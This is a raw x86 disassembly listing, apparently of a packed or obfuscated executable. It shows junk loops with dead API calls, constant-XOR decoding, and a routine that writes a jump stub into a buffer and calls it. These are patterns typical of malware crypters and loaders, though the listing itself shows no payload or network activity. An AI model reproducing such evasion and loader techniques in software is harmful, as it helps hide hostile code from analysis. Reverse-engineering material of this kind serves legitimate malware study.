  416c6e:	sbb    DWORD PTR [esi+0x2a],ebx
  416c71:	pop    edi
  416c72:	mov    esp,0x200911e6
  416c77:	mov    cl,BYTE PTR [eax-0x77]
  416c7a:	xchg   edx,eax
  416c7b:	loope  0x416c53
  416c7d:	mov    ebp,0xf4fdb2fe
  416c82:	(bad)  
  416c83:	mov    ch,0x76
  416c85:	into   
  416c86:	ins    DWORD PTR es:[edi],dx
  416c87:	sbb    al,0xc4
  416c89:	daa    
  416c8a:	in     al,0xde
  416c8c:	mov    eax,0xceedf88b
  416c91:	cmp    bl,BYTE PTR [ebp-0x41ebcdd]
  416c97:	(bad)  
  416c98:	lea    eax,[esi]
  416c9a:	jns    0x416c58
  416c9c:	adc    al,0xed
  416c9e:	loop   0x416cd5
  416ca0:	imul   ecx,eax,0x17516fb8
  416ca6:	(bad)
  416ca9:	ficomp DWORD PTR [eax-0x4948c914]
  416caf:	jle    0x416d24
  416cb1:	les    ebp,FWORD PTR [ebx]
  416cb3:	popa   
  416cb4:	pop    esp
  416cb5:	fnsave [edx]
  416cb7:	bound  ecx,QWORD PTR [edi+0x4210102c]
  416cbd:	sar    BYTE PTR [eax+edi*4+0x6db83726],cl
  416cc4:	sub    BYTE PTR [esi-0x52],dl
  416cc7:	jmp    0x5f8142db
  416ccc:	mov    esp,0xff5c5cb0
  416cd1:	mov    ebx,DWORD PTR [ebp-0x8]
  416cd4:	xor    edx,eax
  416cd6:	xor    ebx,eax
  416cd8:	sub    edx,ebx
  416cda:	sub    edx,esi
  416cdc:	xor    edx,eax
  416cde:	mov    DWORD PTR [ebp+0x8],edx
  416ce1:	mov    edx,DWORD PTR [ebp+0x8]
  416ce4:	mov    ebx,DWORD PTR [ebp-0x58]
  416ce7:	lea    edx,[ebx+edx*1+0x5708f4]
  416cee:	mov    DWORD PTR [ebp-0x58],edx
  416cf1:	mov    edx,DWORD PTR [ebp+0x8]
  416cf4:	mov    ebx,DWORD PTR [ebp-0x54]
  416cf7:	add    edx,0x64f89a
  416cfd:	imul   edx,ebx
  416d00:	mov    DWORD PTR [ebp-0x54],edx
  416d03:	mov    edx,DWORD PTR [ebp+0x8]
  416d06:	mov    ebx,DWORD PTR [ebp-0x50]
  416d09:	add    edx,0x242ebe9
  416d0f:	and    edx,ebx
  416d11:	mov    DWORD PTR [ebp-0x50],edx
  416d14:	mov    edx,DWORD PTR [ebp+0x8]
  416d17:	mov    ebx,DWORD PTR [ebp-0x4c]
  416d1a:	add    edx,ecx
  416d1c:	or     edx,ebx
  416d1e:	mov    DWORD PTR [ebp-0x4c],edx
  416d21:	mov    edx,DWORD PTR [ebp+0x8]
  416d24:	mov    ebx,0xfdbe0321
  416d29:	sub    ebx,edx
  416d2b:	add    ebx,DWORD PTR [ebp-0x48]
  416d2e:	mov    DWORD PTR [ebp-0x48],ebx
  416d31:	mov    edx,DWORD PTR [ebp+0x8]
  416d34:	mov    ebx,DWORD PTR [ebp-0x44]
  416d37:	add    edx,edi
  416d39:	xor    edx,ebx
  416d3b:	mov    DWORD PTR [ebp-0x44],edx
  416d3e:	mov    edx,DWORD PTR [ebp+0x8]
  416d41:	xor    edx,eax
  416d43:	add    edx,esi
  416d45:	jne    0x41497b
  416d4b:	jmp    0x416dd8
  416d50:	mov    edx,DWORD PTR [ebp-0x14]
  416d53:	mov    DWORD PTR [ebp+0x8],edx
  416d56:	jmp    0x416dcb
  416d5b:	mov    edx,DWORD PTR [ebp+0x8]
  416d5e:	mov    ebx,DWORD PTR [ebp-0x8]
  416d61:	xor    edx,eax
  416d63:	xor    ebx,eax
  416d65:	sub    edx,ebx
  416d67:	sub    edx,esi
  416d69:	xor    edx,eax
  416d6b:	mov    DWORD PTR [ebp+0x8],edx
  416d6e:	mov    edx,DWORD PTR [ebp+0x8]
  416d71:	mov    ebx,DWORD PTR [ebp-0x58]
  416d74:	lea    edx,[ebx+edx*1+0x5708f4]
  416d7b:	mov    DWORD PTR [ebp-0x58],edx
  416d7e:	mov    edx,DWORD PTR [ebp+0x8]
  416d81:	mov    ebx,DWORD PTR [ebp-0x54]
  416d84:	add    edx,0x64f89a
  416d8a:	imul   edx,ebx
  416d8d:	mov    DWORD PTR [ebp-0x54],edx
  416d90:	mov    edx,DWORD PTR [ebp+0x8]
  416d93:	mov    ebx,DWORD PTR [ebp-0x50]
  416d96:	add    edx,0x242ebe9
  416d9c:	and    edx,ebx
  416d9e:	mov    DWORD PTR [ebp-0x50],edx
  416da1:	mov    edx,DWORD PTR [ebp+0x8]
  416da4:	mov    ebx,DWORD PTR [ebp-0x4c]
  416da7:	add    edx,ecx
  416da9:	or     edx,ebx
  416dab:	mov    DWORD PTR [ebp-0x4c],edx
  416dae:	mov    edx,DWORD PTR [ebp+0x8]
  416db1:	mov    ebx,0xfdbe0321
  416db6:	sub    ebx,edx
  416db8:	add    ebx,DWORD PTR [ebp-0x48]
  416dbb:	mov    DWORD PTR [ebp-0x48],ebx
  416dbe:	mov    edx,DWORD PTR [ebp+0x8]
  416dc1:	mov    ebx,DWORD PTR [ebp-0x44]
  416dc4:	add    edx,edi
  416dc6:	xor    edx,ebx
  416dc8:	mov    DWORD PTR [ebp-0x44],edx
  416dcb:	mov    edx,DWORD PTR [ebp+0x8]
  416dce:	xor    edx,eax
  416dd0:	add    edx,esi
  416dd2:	jne    0x416d5b
  416dd8:	mov    edx,DWORD PTR [ebp-0x14]
  416ddb:	mov    DWORD PTR [ebp+0x8],edx
  416dde:	jmp    0x416e53
  416de3:	mov    edx,DWORD PTR [ebp+0x8]
  416de6:	mov    ebx,DWORD PTR [ebp-0x8]
  416de9:	xor    edx,eax
  416deb:	xor    ebx,eax
  416ded:	sub    edx,ebx
  416def:	sub    edx,esi
  416df1:	xor    edx,eax
  416df3:	mov    DWORD PTR [ebp+0x8],edx
  416df6:	mov    edx,DWORD PTR [ebp+0x8]
  416df9:	mov    ebx,DWORD PTR [ebp-0x58]
  416dfc:	lea    edx,[ebx+edx*1+0x5708f4]
  416e03:	mov    DWORD PTR [ebp-0x58],edx
  416e06:	mov    edx,DWORD PTR [ebp+0x8]
  416e09:	mov    ebx,DWORD PTR [ebp-0x54]
  416e0c:	add    edx,0x64f89a
  416e12:	imul   edx,ebx
  416e15:	mov    DWORD PTR [ebp-0x54],edx
  416e18:	mov    edx,DWORD PTR [ebp+0x8]
  416e1b:	mov    ebx,DWORD PTR [ebp-0x50]
  416e1e:	add    edx,0x242ebe9
  416e24:	and    edx,ebx
  416e26:	mov    DWORD PTR [ebp-0x50],edx
  416e29:	mov    edx,DWORD PTR [ebp+0x8]
  416e2c:	mov    ebx,DWORD PTR [ebp-0x4c]
  416e2f:	add    edx,ecx
  416e31:	or     edx,ebx
  416e33:	mov    DWORD PTR [ebp-0x4c],edx
  416e36:	mov    edx,DWORD PTR [ebp+0x8]
  416e39:	mov    ebx,0xfdbe0321
  416e3e:	sub    ebx,edx
  416e40:	add    ebx,DWORD PTR [ebp-0x48]
  416e43:	mov    DWORD PTR [ebp-0x48],ebx
  416e46:	mov    edx,DWORD PTR [ebp+0x8]
  416e49:	mov    ebx,DWORD PTR [ebp-0x44]
  416e4c:	add    edx,edi
  416e4e:	xor    edx,ebx
  416e50:	mov    DWORD PTR [ebp-0x44],edx
  416e53:	mov    edx,DWORD PTR [ebp+0x8]
  416e56:	xor    edx,eax
  416e58:	add    edx,esi
  416e5a:	jne    0x416de3
  416e60:	mov    edx,DWORD PTR [ebp-0x8]
  416e63:	mov    ebx,DWORD PTR [ebp-0xc]
  416e66:	xor    edx,eax
  416e68:	lea    edx,[edx+ebx*1+0x3272fa]
  416e6f:	mov    DWORD PTR [ebp-0xc],edx
  416e72:	mov    edx,DWORD PTR [ebp-0x10]
  416e75:	xor    edx,eax
  416e77:	add    edx,esi
  416e79:	jne    0x412518
  416e7f:	jmp    0x416f96
  416e84:	mov    ecx,DWORD PTR [ebp-0x14]
  416e87:	mov    DWORD PTR [ebp+0x8],ecx
  416e8a:	jmp    0x416f03
  416e8f:	mov    ecx,DWORD PTR [ebp+0x8]
  416e92:	mov    edx,DWORD PTR [ebp-0x8]
  416e95:	xor    ecx,eax
  416e97:	xor    edx,eax
  416e99:	sub    ecx,edx
  416e9b:	sub    ecx,esi
  416e9d:	xor    ecx,eax
  416e9f:	mov    DWORD PTR [ebp+0x8],ecx
  416ea2:	mov    ecx,DWORD PTR [ebp+0x8]
  416ea5:	mov    edx,DWORD PTR [ebp-0x58]
  416ea8:	lea    ecx,[edx+ecx*1+0x5708f4]
  416eaf:	mov    DWORD PTR [ebp-0x58],ecx
  416eb2:	mov    ecx,DWORD PTR [ebp+0x8]
  416eb5:	mov    edx,DWORD PTR [ebp-0x54]
  416eb8:	add    ecx,0x64f89a
  416ebe:	imul   ecx,edx
  416ec1:	mov    DWORD PTR [ebp-0x54],ecx
  416ec4:	mov    ecx,DWORD PTR [ebp+0x8]
  416ec7:	mov    edx,DWORD PTR [ebp-0x50]
  416eca:	add    ecx,0x242ebe9
  416ed0:	and    ecx,edx
  416ed2:	mov    DWORD PTR [ebp-0x50],ecx
  416ed5:	mov    ecx,DWORD PTR [ebp+0x8]
  416ed8:	mov    edx,DWORD PTR [ebp-0x4c]
  416edb:	add    ecx,0xf641bea
  416ee1:	or     ecx,edx
  416ee3:	mov    DWORD PTR [ebp-0x4c],ecx
  416ee6:	mov    ecx,DWORD PTR [ebp+0x8]
  416ee9:	mov    edx,0xfdbe0321
  416eee:	sub    edx,ecx
  416ef0:	add    edx,DWORD PTR [ebp-0x48]
  416ef3:	mov    DWORD PTR [ebp-0x48],edx
  416ef6:	mov    ecx,DWORD PTR [ebp+0x8]
  416ef9:	mov    edx,DWORD PTR [ebp-0x44]
  416efc:	add    ecx,edi
  416efe:	xor    ecx,edx
  416f00:	mov    DWORD PTR [ebp-0x44],ecx
  416f03:	mov    ecx,DWORD PTR [ebp+0x8]
  416f06:	xor    ecx,eax
  416f08:	add    ecx,esi
  416f0a:	jne    0x416e8f
  416f10:	jmp    0x416fa2
  416f15:	mov    ecx,DWORD PTR [ebp+0x8]
  416f18:	mov    edx,DWORD PTR [ebp-0x8]
  416f1b:	xor    ecx,eax
  416f1d:	xor    edx,eax
  416f1f:	sub    ecx,edx
  416f21:	sub    ecx,esi
  416f23:	xor    ecx,eax
  416f25:	mov    DWORD PTR [ebp+0x8],ecx
  416f28:	mov    ecx,DWORD PTR [ebp+0x8]
  416f2b:	mov    edx,DWORD PTR [ebp-0x58]
  416f2e:	lea    ecx,[edx+ecx*1+0x5708f4]
  416f35:	mov    DWORD PTR [ebp-0x58],ecx
  416f38:	mov    ecx,DWORD PTR [ebp+0x8]
  416f3b:	mov    edx,DWORD PTR [ebp-0x54]
  416f3e:	add    ecx,0x64f89a
  416f44:	imul   ecx,edx
  416f47:	mov    DWORD PTR [ebp-0x54],ecx
  416f4a:	mov    ecx,DWORD PTR [ebp+0x8]
  416f4d:	mov    edx,DWORD PTR [ebp-0x50]
  416f50:	add    ecx,0x242ebe9
  416f56:	and    ecx,edx
  416f58:	mov    DWORD PTR [ebp-0x50],ecx
  416f5b:	mov    ecx,DWORD PTR [ebp+0x8]
  416f5e:	mov    edx,DWORD PTR [ebp-0x4c]
  416f61:	add    ecx,0xf641bea
  416f67:	or     ecx,edx
  416f69:	mov    DWORD PTR [ebp-0x4c],ecx
  416f6c:	mov    ecx,DWORD PTR [ebp+0x8]
  416f6f:	mov    edx,0xfdbe0321
  416f74:	sub    edx,ecx
  416f76:	add    edx,DWORD PTR [ebp-0x48]
  416f79:	mov    DWORD PTR [ebp-0x48],edx
  416f7c:	mov    ecx,DWORD PTR [ebp+0x8]
  416f7f:	mov    edx,DWORD PTR [ebp-0x44]
  416f82:	add    ecx,edi
  416f84:	xor    ecx,edx
  416f86:	mov    DWORD PTR [ebp-0x44],ecx
  416f89:	mov    ecx,DWORD PTR [ebp+0x8]
  416f8c:	xor    ecx,eax
  416f8e:	add    ecx,esi
  416f90:	jne    0x416f15
  416f96:	mov    ecx,DWORD PTR [ebp-0x8]
  416f99:	xor    ecx,eax
  416f9b:	mov    eax,DWORD PTR [ebp+0x10]
  416f9e:	add    ecx,esi
  416fa0:	mov    DWORD PTR [eax],ecx
  416fa2:	pop    edi
  416fa3:	pop    esi
  416fa4:	pop    ebx
  416fa5:	leave  
  416fa6:	ret    0xc
  416fa9:	push   ebp
  416faa:	mov    ebp,esp
  416fac:	sub    esp,0x78
  416faf:	add    DWORD PTR ds:0x426f25,0x66eb
  416fb9:	push   esi
  416fba:	mov    esi,DWORD PTR ds:0x426f55
  416fc0:	mov    eax,ds:0x428ce1
  416fc5:	sub    eax,esi
  416fc7:	imul   esi,DWORD PTR [esi+eax*1]
  416fcb:	push   edi
  416fcc:	xor    esi,esi
  416fce:	or     esi,DWORD PTR ds:0x42af45
  416fd4:	mov    esi,DWORD PTR [esi]
  416fd6:	sbb    DWORD PTR ds:0x426e8d,esi
  416fdc:	mov    eax,ds:0x4262c9
  416fe1:	mov    DWORD PTR [ebp-0x24],eax
  416fe4:	and    DWORD PTR ds:0x426eb9,0x0
  416fee:	mov    esi,DWORD PTR ds:0x426eb9
  416ff4:	inc    esi
  416ff5:	mov    DWORD PTR ds:0x426eb9,esi
  416ffb:	cmp    DWORD PTR ds:0x426eb9,0x4
  417002:	jbe    0x41703f
  417008:	jmp    0x417018
  41700d:	push   0x2f87
  417012:	call   DWORD PTR ds:0x430a2c
  417018:	cmp    DWORD PTR ds:0x426eb9,0x3
  41701f:	jne    0x417032
  417025:	mov    esi,DWORD PTR ds:0x426eb9
  41702b:	inc    esi
  41702c:	mov    DWORD PTR ds:0x426eb9,esi
  417032:	cmp    DWORD PTR ds:0x426eb9,0x19
  417039:	jb     0x416fee
  41703f:	mov    eax,ds:0x4263e9
  417044:	mov    DWORD PTR [ebp-0x30],eax
  417047:	sub    esi,esi
  417049:	mov    DWORD PTR [ebp-0x2c],0xf89c85b5
  417050:	mov    DWORD PTR [ebp-0x28],0xf89c85b4
  417057:	and    DWORD PTR ds:0x426ec1,0x0
  417061:	jmp    0x417074
  417066:	xor    eax,eax
  417068:	add    eax,DWORD PTR ds:0x426ec1
  41706e:	inc    eax
  41706f:	mov    ds:0x426ec1,eax
  417074:	cmp    DWORD PTR ds:0x426ec1,0x13
  41707b:	jae    0x4170b9
  417081:	cmp    DWORD PTR ds:0x426ec1,0x5
  417088:	jg     0x4170b9
  41708e:	jmp    0x417099
  417093:	call   DWORD PTR ds:0x430a00
  417099:	cmp    DWORD PTR ds:0x426ec1,0x4
  4170a0:	jne    0x4170b4
  4170a6:	xor    eax,eax
  4170a8:	xor    eax,DWORD PTR ds:0x426ec1
  4170ae:	inc    eax
  4170af:	mov    ds:0x426ec1,eax
  4170b4:	jmp    0x417066
  4170b9:	mov    eax,DWORD PTR [ebp-0x10]
  4170bc:	mov    ecx,DWORD PTR [ebp-0x10]
  4170bf:	sub    eax,ecx
  4170c1:	mov    ecx,DWORD PTR ds:0x428ced
  4170c7:	mov    ecx,DWORD PTR [ecx]
  4170c9:	and    DWORD PTR ds:0x426ed5,ecx
  4170cf:	mov    DWORD PTR [ebp-0x10],eax
  4170d2:	and    DWORD PTR ds:0x426ec1,0x0
  4170dc:	xor    ecx,ecx
  4170de:	or     ecx,DWORD PTR ds:0x426ec1
  4170e4:	inc    ecx
  4170e5:	mov    DWORD PTR ds:0x426ec1,ecx
  4170eb:	cmp    DWORD PTR ds:0x426ec1,0x8
  4170f2:	ja     0x417153
  4170f8:	jmp    0x41712c
  4170fd:	push   0x4411
  417102:	push   DWORD PTR [ebp-0x28]
  417105:	push   0x7cba
  41710a:	push   0x1619
  41710f:	push   DWORD PTR [ebp-0x28]
  417112:	push   0x5e18
  417117:	push   0x6c27
  41711c:	push   0x15fe
  417121:	push   0x4181
  417126:	call   DWORD PTR ds:0x430a04
  41712c:	cmp    DWORD PTR ds:0x426ec1,0x7
  417133:	jne    0x417146
  417139:	mov    ecx,DWORD PTR ds:0x426ec1
  41713f:	inc    ecx
  417140:	mov    DWORD PTR ds:0x426ec1,ecx
  417146:	cmp    DWORD PTR ds:0x426ec1,0x1b
  41714d:	jb     0x4170dc
  417153:	xor    DWORD PTR [ebp-0x10],0xf89cb5b5
  41715a:	mov    edi,DWORD PTR ds:0x426e95
  417160:	xor    DWORD PTR ds:0x426e91,edi
  417166:	mov    eax,DWORD PTR [ebp-0x18]
  417169:	mov    DWORD PTR ds:0x426e89,0x1f
  417173:	cmp    DWORD PTR ds:0x426e89,0x0
  41717a:	je     0x4171aa
  417180:	cmp    DWORD PTR ds:0x426e89,0x28
  417187:	jg     0x4171aa
  41718d:	jmp    0x417198
  417192:	call   DWORD PTR ds:0x430a38
  417198:	mov    esi,DWORD PTR ds:0x426e89
  41719e:	dec    esi
  41719f:	mov    DWORD PTR ds:0x426e89,esi
  4171a5:	jmp    0x417173
  4171aa:	mov    ecx,DWORD PTR [ebp-0x18]
  4171ad:	sbb    DWORD PTR ds:0x426e91,ebx
  4171b3:	sub    eax,ecx
  4171b5:	mov    DWORD PTR [ebp-0x18],eax
  4171b8:	sbb    ecx,DWORD PTR ds:0x426ed5
  4171be:	or     DWORD PTR [ebp-0x18],0xf89f05b5
  4171c5:	mov    eax,DWORD PTR [ebp-0xc]
  4171c8:	mov    ecx,DWORD PTR [ebp-0xc]
  4171cb:	adc    DWORD PTR ds:0x426eed,0xa48
  4171d5:	sub    eax,ecx
  4171d7:	mov    DWORD PTR [ebp-0xc],eax
  4171da:	or     DWORD PTR [ebp-0xc],0xf89c85f5
  4171e1:	mov    DWORD PTR ds:0x426eb9,0x1e
  4171eb:	cmp    DWORD PTR ds:0x426eb9,0x0
  4171f2:	je     0x417222
  4171f8:	cmp    DWORD PTR ds:0x426eb9,0x24
  4171ff:	jb     0x417222
  417205:	jmp    0x417210
  41720a:	call   DWORD PTR ds:0x430a08
  417210:	mov    esi,DWORD PTR ds:0x426eb9
  417216:	dec    esi
  417217:	mov    DWORD PTR ds:0x426eb9,esi
  41721d:	jmp    0x4171eb
  417222:	mov    eax,DWORD PTR [ebp-0x1c]
  417225:	mov    ecx,DWORD PTR [ebp-0x1c]
  417228:	sub    eax,ecx
  41722a:	mov    DWORD PTR [ebp-0x1c],eax
  41722d:	or     DWORD PTR [ebp-0x1c],0xf89c8595
  417234:	mov    eax,DWORD PTR [ebp-0x20]
  417237:	mov    ecx,DWORD PTR [ebp-0x20]
  41723a:	sub    eax,ecx
  41723c:	mov    DWORD PTR [ebp-0x20],eax
  41723f:	mov    eax,DWORD PTR [ebp-0x2c]
  417242:	mov    ecx,DWORD PTR [ebp-0x20]
  417245:	mov    esi,0x75108b3
  41724a:	xor    eax,esi
  41724c:	mov    edi,0x3272fa
  417251:	add    eax,edi
  417253:	or     eax,ecx
  417255:	mov    DWORD PTR [ebp-0x20],eax
  417258:	mov    eax,DWORD PTR [ebp-0x4]
  41725b:	mov    ecx,DWORD PTR [ebp-0x4]
  41725e:	sub    eax,ecx
  417260:	mov    DWORD PTR [ebp-0x4],eax
  417263:	or     DWORD PTR [ebp-0x4],0xf89c85b8
  41726a:	mov    eax,DWORD PTR [ebp-0xc]
  41726d:	xor    eax,esi
  41726f:	add    eax,edi
  417271:	push   eax
  417272:	mov    eax,DWORD PTR [ebp-0x10]
  417275:	xor    eax,esi
  417277:	add    eax,edi
  417279:	push   eax
  41727a:	mov    eax,DWORD PTR [ebp-0x4]
  41727d:	xor    eax,esi
  41727f:	add    eax,0x3272fe
  417284:	push   eax
  417285:	lea    eax,[ebp-0x78]
  417288:	push   eax
  417289:	push   DWORD PTR [ebp-0x2c]
  41728c:	push   DWORD PTR [ebp-0x28]
  41728f:	call   0x40d3b8
  417294:	test   eax,eax
  417296:	je     0x4172c4
  41729c:	lea    eax,[ebp-0x78]
  41729f:	push   eax
  4172a0:	mov    eax,DWORD PTR [ebp-0x28]
  4172a3:	xor    eax,esi
  4172a5:	add    eax,edi
  4172a7:	push   eax
  4172a8:	mov    eax,DWORD PTR [ebp-0x24]
  4172ab:	add    eax,0xaa
  4172b0:	push   eax
  4172b1:	mov    eax,DWORD PTR [ebp-0x24]
  4172b4:	mov    eax,DWORD PTR [eax+0x198]
  4172ba:	push   DWORD PTR [eax]
  4172bc:	call   0x408594
  4172c1:	mov    DWORD PTR [ebp-0x14],eax
  4172c4:	mov    ecx,DWORD PTR ds:0x4263c1
  4172ca:	lea    eax,[ebp+0x4]
  4172cd:	mov    DWORD PTR [ecx*4+0x4263b9],eax
  4172d4:	inc    DWORD PTR ds:0x4263c1
  4172da:	mov    eax,DWORD PTR [ebp-0x14]
  4172dd:	test   eax,eax
  4172df:	je     0x417351
  4172e5:	lea    eax,[ebp-0x8]
  4172e8:	mov    DWORD PTR [ebp-0x34],eax
  4172eb:	mov    eax,DWORD PTR [ebp-0x30]
  4172ee:	mov    DWORD PTR [ebp-0x8],eax
  4172f1:	mov    eax,DWORD PTR [ebp-0x8]
  4172f4:	mov    ecx,DWORD PTR [ebp-0x14]
  4172f7:	sub    eax,ecx
  4172f9:	mov    DWORD PTR [ebp-0x8],eax
  4172fc:	mov    ecx,DWORD PTR [ebp-0x4]
  4172ff:	xor    ecx,esi
  417301:	mov    eax,0xffcd8d06
  417306:	sub    eax,ecx
  417308:	add    DWORD PTR [ebp-0x8],eax
  41730b:	mov    eax,DWORD PTR [ebp-0x14]
  41730e:	mov    DWORD PTR [eax],0x675565e9
  417314:	mov    DWORD PTR [eax+0x4],0x76576787
  41731b:	mov    eax,DWORD PTR [ebp-0x8]
  41731e:	mov    ecx,DWORD PTR [ebp-0x14]
  417321:	push   DWORD PTR [ebp-0x24]
  417324:	mov    DWORD PTR [ecx+0x1],eax
  417327:	mov    eax,ds:0x426145
  41732c:	push   DWORD PTR [eax]
  41732e:	push   DWORD PTR ds:0x4263a9
  417334:	push   DWORD PTR ds:0x42614d
  41733a:	push   DWORD PTR ds:0x426389
  417340:	push   DWORD PTR ds:0x426cc9
  417346:	push   DWORD PTR [ebp-0x28]
  417349:	push   DWORD PTR [ebp-0x2c]
  41734c:	mov    eax,DWORD PTR [ebp-0x14]
  41734f:	call   eax
  417351:	pop    edi
  417352:	pop    esi
  417353:	leave  
  417354:	ret    
  417355:	push   ebp
  417356:	mov    ebp,esp
  417358:	sub    esp,0x34
  41735b:	neg    edx
  41735d:	push   ebx
  41735e:	adc    edx,ecx
  417360:	push   esi
  417361:	push   edi
  417362:	xor    ecx,0x2a8a
  417368:	mov    DWORD PTR [ebp-0x10],0xf89f85b5
  41736f:	mov    edx,DWORD PTR ds:0x429d41
  417375:	xor    esi,esi
  417377:	xor    esi,DWORD PTR ds:0x429d55
  41737d:	sub    esi,edx
  41737f:	add    edx,DWORD PTR [edx+esi*1]
  417382:	lea    eax,[ebp+0x14]
  417385:	sub    ecx,0x2a97
  41738b:	mov    DWORD PTR [ebp-0x4],eax
  41738e:	sub    DWORD PTR ds:0x426e8d,0x3cd0
  417398:	mov    DWORD PTR [ebp-0xc],0xf89c85b5
  41739f:	xor    DWORD PTR ds:0x426ea1,ebx
  4173a5:	lea    eax,[ebp-0xc]
  4173a8:	add    esi,ecx
  4173aa:	mov    DWORD PTR [ebp-0x14],eax
  4173ad:	xor    DWORD PTR ds:0x426f29,ecx
  4173b3:	mov    eax,DWORD PTR [ebp-0xc]
  4173b6:	or     ecx,edx
  4173b8:	mov    edx,DWORD PTR [ebp-0x14]
  4173bb:	mov    ecx,DWORD PTR ds:0x426f4d
  4173c1:	mov    esi,DWORD PTR ds:0x429d55
  4173c7:	sub    ecx,esi
  4173c9:	imul   ecx,DWORD PTR [ecx+esi*1]
  4173cd:	mov    ecx,0x75108b3
  4173d2:	and    DWORD PTR ds:0x426eb9,0x0
  4173dc:	xor    esi,esi
  4173de:	add    esi,DWORD PTR ds:0x426eb9
  4173e4:	inc    esi
  4173e5:	mov    DWORD PTR ds:0x426eb9,esi
  4173eb:	cmp    DWORD PTR ds:0x426eb9,0x9
  4173f2:	jle    0x41742f
  4173f8:	jmp    0x417408
  4173fd:	push   0x8342
  417402:	call   DWORD PTR ds:0x430a3c
  417408:	cmp    DWORD PTR ds:0x426eb9,0x8
  41740f:	jne    0x417422
  417415:	mov    esi,DWORD PTR ds:0x426eb9
  41741b:	inc    esi
  41741c:	mov    DWORD PTR ds:0x426eb9,esi
  417422:	cmp    DWORD PTR ds:0x426eb9,0x10
  417429:	jb     0x4173dc
  41742f:	xor    eax,ecx
  417431:	mov    esi,DWORD PTR ds:0x426eb9
  417437:	xor    esi,DWORD PTR ds:0x426f0d
  41743d:	mov    DWORD PTR ds:0x426eb9,esi
  417443:	add    eax,0x3272fa
  417448:	xor    esi,0x7991
  41744e:	mov    DWORD PTR [edx],eax
  417450:	mov    eax,ds:0x426141
  417455:	mov    edx,DWORD PTR [ebp-0x4]
  417458:	mov    eax,DWORD PTR [eax]
  41745a:	add    eax,DWORD PTR [edx]
  41745c:	and    DWORD PTR ds:0x426ed9,edx
  417462:	mov    DWORD PTR [ebp-0x8],eax
  417465:	and    DWORD PTR ds:0x426ecd,0x0
  41746f:	mov    edx,DWORD PTR ds:0x426ecd
  417475:	inc    edx
  417476:	mov    DWORD PTR ds:0x426ecd,edx
  41747c:	cmp    DWORD PTR ds:0x426ecd,0x5
  417483:	ja     0x4174d7
  417489:	jmp    0x4174b0
  41748e:	push   0x426ecd
  417493:	push   0x17b9
  417498:	push   0x1b0d
  41749d:	push   0x1721
  4174a2:	push   DWORD PTR [ebp-0xc]
  4174a5:	push   0x619f
  4174aa:	call   DWORD PTR ds:0x430a40
  4174b0:	cmp    DWORD PTR ds:0x426ecd,0x4
  4174b7:	jne    0x4174ca
  4174bd:	mov    edx,DWORD PTR ds:0x426ecd
  4174c3:	inc    edx
  4174c4:	mov    DWORD PTR ds:0x426ecd,edx
  4174ca:	cmp    DWORD PTR ds:0x426ecd,0x11
  4174d1:	jb     0x41746f
  4174d7:	mov    esi,DWORD PTR [ebp+0x8]
  4174da:	and    DWORD PTR ds:0x426e81,0x0
  4174e4:	mov    eax,ds:0x426e81
  4174e9:	inc    eax
  4174ea:	mov    ds:0x426e81,eax
  4174ef:	cmp    DWORD PTR ds:0x426e81,0x9
  4174f6:	ja     0x417532
  4174fc:	jmp    0x41750a
  417501:	push   DWORD PTR [ebp-0x14]
  417504:	call   DWORD PTR ds:0x430a0c
  41750a:	cmp    DWORD PTR ds:0x426e81,0x8
  417511:	jne    0x417525
  417517:	xor    eax,eax
  417519:	xor    eax,DWORD PTR ds:0x426e81
  41751f:	inc    eax
  417520:	mov    ds:0x426e81,eax
  417525:	cmp    DWORD PTR ds:0x426e81,0x18
  41752c:	jb     0x4174e4
  417532:	mov    eax,ds:0x4262c9
  417537:	and    DWORD PTR ds:0x426e99,0x0
  417541:	mov    edx,DWORD PTR ds:0x426e99
  417547:	inc    edx
  417548:	mov    DWORD PTR ds:0x426e99,edx
  41754e:	cmp    DWORD PTR ds:0x426e99,0xa
  417555:	jbe    0x417595
  41755b:	jmp    0x41756e
  417560:	push   DWORD PTR [ebp-0x14]
  417563:	push   0x426035
  417568:	call   DWORD PTR ds:0x430a44
  41756e:	cmp    DWORD PTR ds:0x426e99,0x9
  417575:	jne    0x417588
  41757b:	mov    edx,DWORD PTR ds:0x426e99
  417581:	inc    edx
  417582:	mov    DWORD PTR ds:0x426e99,edx
  417588:	cmp    DWORD PTR ds:0x426e99,0x1f
  41758f:	jb     0x417541
  417595:	mov    eax,DWORD PTR [eax+0x198]
  41759b:	xor    DWORD PTR ds:0x426efd,0x2868
  4175a5:	xor    esi,ecx
  4175a7:	mov    edx,DWORD PTR ds:0x426e91
  4175ad:	sbb    edx,DWORD PTR ds:0x426f1d
  4175b3:	mov    DWORD PTR ds:0x426e91,edx
  4175b9:	mov    edx,0x3272fa
  4175be:	add    esi,edx
  4175c0:	cmp    DWORD PTR [eax],esi
  4175c2:	mov    DWORD PTR ds:0x426f25,0x290b
  4175cc:	je     0x4175d9
  4175d2:	mov    eax,DWORD PTR [eax]
  4175d4:	jmp    0x41c1c5
  4175d9:	and    DWORD PTR ds:0x426e85,0x0
  4175e3:	jmp    0x4175f5
  4175e8:	mov    esi,DWORD PTR ds:0x426e85
  4175ee:	inc    esi
  4175ef:	mov    DWORD PTR ds:0x426e85,esi
  4175f5:	cmp    DWORD PTR ds:0x426e85,0x15
  4175fc:	jae    0x417657
  417602:	cmp    DWORD PTR ds:0x426e85,0xd
  417609:	jge    0x417657
  41760f:	jmp    0x417636
  417614:	push   DWORD PTR [ebp-0x14]
  417617:	push   0x2c9c
  41761c:	push   DWORD PTR [ebp-0x28]
  41761f:	push   0x295b
  417624:	push   DWORD PTR [ebp-0x24]
  417627:	push   DWORD PTR [ebp-0x24]
  41762a:	push   DWORD PTR [ebp-0x14]
  41762d:	push   DWORD PTR [ebp-0x1c]
  417630:	call   DWORD PTR ds:0x430a10
  417636:	cmp    DWORD PTR ds:0x426e85,0xc
  41763d:	jne    0x417652
  417643:	xor    esi,esi
  417645:	xor    esi,DWORD PTR ds:0x426e85
  41764b:	inc    esi
  41764c:	mov    DWORD PTR ds:0x426e85,esi
  417652:	jmp    0x4175e8
  417657:	mov    eax,DWORD PTR [ebp+0x18]
  41765a:	and    DWORD PTR ds:0x426f09,0x0
  417664:	jmp    0x417678
  417669:	xor    esi,esi
  41766b:	or     esi,DWORD PTR ds:0x426f09
  417671:	inc    esi
  417672:	mov    DWORD PTR ds:0x426f09,esi
  417678:	cmp    DWORD PTR ds:0x426f09,0x1e
  41767f:	jae    0x4176a2
  417685:	cmp    DWORD PTR ds:0x426f09,0x29
  41768c:	jl     0x4176a2
  417692:	jmp    0x41769d
  417697:	call   DWORD PTR ds:0x430a14
